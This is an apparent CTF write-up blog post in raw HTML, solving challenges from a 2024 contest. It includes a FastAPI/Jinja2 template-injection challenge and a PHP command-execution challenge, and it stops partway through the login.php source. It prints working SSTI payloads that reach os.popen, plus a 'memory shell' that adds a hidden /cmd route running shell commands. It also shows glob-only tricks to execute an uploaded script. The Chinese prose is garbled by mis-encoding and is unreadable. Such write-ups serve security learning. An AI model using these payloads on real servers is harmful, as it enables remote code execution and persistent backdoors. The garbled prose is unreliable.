    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>webä¸“åœºï¼ˆx</p><p>ææƒä¸“åœºï¼ˆâˆš</p><span id="more"></span><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817211814882.png" alt="image-20240817211814882"></p><hr><h1 id="EncirclingGame"><a href="#EncirclingGame" class="headerlink" title="EncirclingGame"></a>EncirclingGame</h1><p>å°æ¸¸æˆ</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817100613146.png" alt="image-20240817100613146"></p><hr><h1 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h1><blockquote><p>fastapi + å†…å­˜é©¬</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> jinja2<span class="token keyword">import</span> functools<span class="token keyword">import</span> uvicorn<span class="token keyword">from</span> fastapi <span class="token keyword">import</span> FastAPI<span class="token keyword">from</span> fastapi<span class="token punctuation">.</span>templating <span class="token keyword">import</span> Jinja2Templates<span class="token keyword">from</span> anyio <span class="token keyword">import</span> fail_after<span class="token punctuation">,</span> sleep<span class="token keyword">def</span> <span class="token function">timeout_after</span><span class="token punctuation">(</span>timeout<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token decorator annotation punctuation">@functools<span class="token punctuation">.</span>wraps</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span>        <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> fail_after<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">await</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator    app <span class="token operator">=</span> FastAPI<span class="token punctuation">(</span><span class="token punctuation">)</span>access <span class="token operator">=</span> <span class="token boolean">False</span>_base_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>t <span class="token operator">=</span> Jinja2Templates<span class="token punctuation">(</span>directory<span class="token operator">=</span>_base_path<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@timeout_after</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@timeout_after</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">ssti</span><span class="token punctuation">(</span>calc_req<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> access    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">any</span><span class="token punctuation">(</span>char<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> calc_req<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token keyword">in</span> calc_req<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">not</span> calc_req<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> access<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"bad char"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        jinja2<span class="token punctuation">.</span>Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>jinja2<span class="token punctuation">.</span>BaseLoader<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"&#123;&#123;&#123;&#123; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>calc_req<span class="token punctuation">&#125;</span></span><span class="token string"> &#125;&#125;&#125;&#125;"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"app"</span><span class="token punctuation">:</span> app<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        access <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token string">"fight"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®openapi.jsonè·å¾—æ¥å£åˆ—è¡¨</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"openapi"</span><span class="token operator">:</span> <span class="token string">"3.1.0"</span><span class="token punctuation">,</span>  <span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"FastAPI"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"/"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Index"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"index__get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/calc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Ssti"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"ssti_calc_get"</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"calc_req"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Calc Req"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"components"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"schemas"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"HTTPValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/ValidationError"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Detail"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"HTTPValidationError"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"ValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"loc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">]</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Location"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Message"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Error Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"loc"</span><span class="token punctuation">,</span>          <span class="token string">"msg"</span><span class="token punctuation">,</span>          <span class="token string">"type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"ValidationError"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®šä¹‰äº†è¿™å‡ ä¸ªapiè·¯å¾„ï¼š</p><p><code>/</code>ï¼šæ ¹è·¯å¾„ï¼Œgetæ–¹æ³•</p><p><code>/calc</code>ï¼šsstiï¼Œå‚æ•°calc_req</p><p>é‚£å°±å¾ˆæ˜æ˜¾æ˜¯è¦sstiäº†ï¼Œå‚è€ƒ<a href="https://medium.com/dsf-developers/how-to-handle-an-ssti-vulnerability-in-jinja2-58242e561d4f">https://medium.com/dsf-developers/how-to-handle-an-ssti-vulnerability-in-jinja2-58242e561d4f</a></p><p>ä½†æ˜¯è¿™é‡Œçš„wafï¼š<code>if (any(char.isdigit() for char in calc_req)) or (&quot;%&quot; in calc_req) or not calc_req.isascii() or access</code></p><ul><li>æ£€æŸ¥<code>calc_req</code>ä¸­æ˜¯å¦åŒ…å«æ•°å­—å­—ç¬¦</li><li>æ£€æŸ¥<code>calc_req</code>ä¸­æ˜¯å¦åŒ…å«<code>%</code>å­—ç¬¦</li><li>æ£€æŸ¥<code>calc_req</code>ä¸­çš„å­—ç¬¦æ˜¯å¦ä¸æ˜¯ASCIIå­—ç¬¦</li><li>æ£€æŸ¥å…¨å±€å˜é‡<code>access</code>æ˜¯å¦ä¸ºçœŸ</li></ul><p>å½±å“ä¸å¤§ï¼Œæœ¬åœ°æµ‹è¯•çš„payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>èƒ½å¼¹è®¡ç®—å™¨</p><p>æ¥ä¸‹æ¥ç”±äºbanæ‰äº†æ•°å­—ï¼Œä¸å¥½å¼¹shellï¼Œåº”è¯¥æ˜¯è¦æ‰“å†…å­˜é©¬ï¼Œåœ¨fastapiçš„ä¾èµ–ä¸­æ‰¾åˆ°<code>add_api_route</code>è¿™ä¸ªæ–¹æ³•ï¼Œç„¶åæ„é€ æˆ‘ä»¬çš„åŒ¿åå‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯å¯¹åº”äº†é¢˜ç›®æè¿°çš„â€œä¸¾ä¸€åä¸‰â€ï¼Œè¯¶å‰ä¸¤å¤©åˆšå­¦çš„flaskå†…å­˜é©¬è¿™å°±æ´¾ä¸Šç”¨åœºäº†ï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_api_route('/cmd',lambda+:__import__('os').popen('calc').read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"app"</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆçš„payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_api_route('/cmd',lambda+:__import__('os').popen('cat$&#123;IFS&#125;/flag').read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"app"</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817150617706.png" alt="image-20240817150617706"></p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817150637519.png" alt="image-20240817150637519"></p><hr><h1 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h1><blockquote><p>linuxå‘½ä»¤æ„é€  + findææƒ</p></blockquote><p>dirsearchæ‰«ï¼Œç›´æ¥æ‰«å‡ºadmin.htmlï¼Œè¿›å»å‘ç°æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ æ¥å£</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817123229604.png" alt="image-20240817123229604"></p><p>fuzzäº†ä¸€ä¸‹å‘ç°åªæœ‰tï¼Œ<code>/</code>ï¼Œ<code>.</code>ï¼Œ<code>*</code>å’Œç©ºæ ¼ä¸ä¼šè¢«ban</p><p>æ¥ä¸‹æ¥å‡‘å‘½ä»¤æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/*<span class="token comment"># binç›®å½•</span>/*/*<span class="token comment"># [</span>/*/t*<span class="token comment"># tabs</span>/*/*t<span class="token comment"># addpart</span>/t*<span class="token comment"># tmpç›®å½•</span>/*t<span class="token comment"># bootç›®å½•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾ä¸åˆ°å•¥æœ‰ç”¨çš„å‘½ä»¤ï¼Œä½†æ˜¯æ³¨æ„åˆ°ç»™äº†ä¸ªæ–‡ä»¶ä¸Šä¼ è‚¯å®šä¸æ˜¯ç™½ç»™çš„ï¼ŒçŒœæµ‹æ–‡ä»¶åªæ˜¯ä¼ åˆ°äº†&#x2F;tmpä¸‹</p><p>äºæ˜¯å°è¯•ä¸Šä¼ shè„šæœ¬å¹¶æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span> /t*/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817164731624.png" alt="image-20240817164731624"></p><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$target_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$target_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$target_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$random_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token variable">$target_dir</span> <span class="token operator">.</span> <span class="token variable">$random_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload successfully&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload error, but you can try another way&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[\.\/\*t ]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token variable">$output</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid char"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reset'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'true'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/tmp/'</span><span class="token punctuation">;</span>        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$tmp_dir</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ç¯å¢ƒå·²é‡ç½®"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>login.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token 